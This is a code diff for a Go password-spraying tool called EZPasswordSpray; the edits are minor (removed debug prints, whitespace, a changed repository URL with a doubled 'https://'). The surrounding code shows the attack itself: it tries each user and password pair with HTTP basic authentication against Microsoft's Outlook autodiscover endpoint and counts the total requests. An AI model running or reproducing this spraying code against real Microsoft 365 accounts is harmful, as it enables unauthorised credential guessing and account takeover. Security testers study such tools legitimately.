@@ -19,8 +19,6 @@ func spray(user string, pwd string, wg *sync.WaitGroup, progressbar *progressbar
 	defer wg.Done()
 	defer progressbar.Add(1)
 
-	//fmt.Print("\r                                                                      ")
-	//fmt.Print("\rTrying " + user + " : " + pwd)
 	client := &http.Client{}
 	req, _ := http.NewRequest("GET", "https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml", nil)
 	req.SetBasicAuth(user, pwd)
@@ -53,11 +51,11 @@ func main() {
 		"\nIn each line should be one password.")
 
 	flag.Parse()
-
+	
 	users := readFile(*userList)
 	pwds := readFile(*passwordList)
 
-	fmt.Println("Starting EZPasswordSpray ( https://github.com/Mike-Ki/EZPasswordSpray ) at " + start.Format("2006-01-02 15:04"))
+	fmt.Println("Starting EZPasswordSpray ( https://https://github.com/NSIDE-ATTACK-LOGIC/EZPasswordSpray ) at " + start.Format("2006-01-02 15:04"))
 	fmt.Printf("Password Spraying on %v Users, each with %v passwords. (Reqests in total %v)\n", len(users),len(pwds), (len(pwds) * len(users)))
 
 	var wg sync.WaitGroup
